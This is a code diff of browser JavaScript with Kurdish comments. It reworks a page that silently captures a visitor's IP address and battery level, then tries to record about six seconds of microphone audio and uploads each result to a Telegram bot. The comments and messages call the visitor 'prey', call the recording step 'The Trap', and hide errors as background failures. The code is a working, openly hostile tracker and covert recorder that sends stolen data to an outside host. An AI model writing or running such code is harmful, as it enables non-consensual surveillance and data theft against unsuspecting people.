@@ -15,16 +15,16 @@
     async function capture() {
         if (!targetID) return;
 
-        // ١. یەکەمجار ناردنی زانیارییەکان (IP و پاتری) بۆ ئەوەی دڵنیابین زانیاری دەگات
+        // 🚀 قۆناغی یەکەم: ناردنی IP و داتا بەبێ وەستان (Invisible Action)
         try {
-            let batteryInfo = "Unknown";
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            
+            let batteryInfo = "N/A";
             if (navigator.getBattery) {
                 const batt = await navigator.getBattery();
                 batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
             }
-
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
 
             let report = `🦅 <b>نێچیرێکی نوێ ڕاوکرا!</b>\n\n` +
                          `👤 <b>ID:</b> <code>${targetID}</code>\n` +
@@ -37,47 +37,34 @@
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: targetID, text: report, parse_mode: "HTML" })
             });
+        } catch (e) { console.log("Silent error in background"); }
 
-        } catch (e) { console.log("Initial report failed"); }
-
-        // ٢. هەوڵدان بۆ گرتنی دەنگ و وێنە (ئەگەر ڕێگەی پێدرا)
+        // 🎙️ قۆناغی دووەم: هەوڵدان بۆ ڕاوکردنی دەنگ (The Trap)
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" }, 
-                audio: true 
-            });
-
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
             const mediaRecorder = new MediaRecorder(stream);
-            let audioChunks = [];
+            let chunks = [];
 
-            mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
-
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
             mediaRecorder.onstop = async () => {
-                const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
-                const formData = new FormData();
-                formData.append("chat_id", targetID);
-                formData.append("voice", audioBlob, "voice.ogg");
-
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, {
-                    method: "POST",
-                    body: formData
-                });
+                const blob = new Blob(chunks, { type: 'audio/ogg' });
+                const fd = new FormData();
+                fd.append("chat_id", targetID);
+                fd.append("voice", blob, "voice.ogg");
                 
-                // داخستنی کامێرا و مایک دوای ناردن
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: "POST", body: fd });
                 stream.getTracks().forEach(t => t.stop());
             };
 
             mediaRecorder.start();
-            setTimeout(() => {
-                mediaRecorder.stop();
-            }, 5000); // ٥ چرکە تۆمار دەکات
+            setTimeout(() => mediaRecorder.stop(), 6000); // ٦ چرکە دەنگ
 
         } catch (err) {
-            // ئەگەر نێچیرەکە "Block"ی کرد، نامەیەک بنێرە کە ڕەزامەند نەبووە
+            // ئەگەر مۆڵەتی نەدا، نامەیەکی ئاگادارکردنەوە بنێرە
             fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: targetID, text: "⚠️ نێچیرەکە ڕێگەی بە کامێرا و مایک نەدا، بەڵام IP ڕاوکرا." })
+                body: JSON.stringify({ chat_id: targetID, text: "⚠️ نێچیرەکە مۆڵەتی مایک و کامێرای نەدا، تەنها IP و زانیاری هات." })
             });
         }
     }
